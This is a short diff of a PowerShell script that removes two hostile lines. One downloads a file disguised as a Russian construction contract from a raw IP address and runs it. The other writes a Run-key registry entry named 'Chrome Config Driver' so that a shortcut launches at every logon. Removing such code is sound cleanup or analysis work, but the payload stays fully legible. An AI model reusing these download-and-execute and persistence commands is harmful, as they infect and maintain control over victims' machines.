@@ -1,5 +1,3 @@
-$client = new-object System.Net.WebClient;$client.DownloadFile("http://194.15.112.220:8011/dogovor-podryad-stroy.txt", "$env:temp\dogovor-podryad-stroy.txt"); Start-Process "$env:temp\dogovor-podryad-stroy.txt";
-reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /V "Chrome Config Driver" /t REG_SZ /F /D "C:\users\Public\Music\findr.lnk";
 $client = $null;
 $stream = $null;
 $buffer = $null;
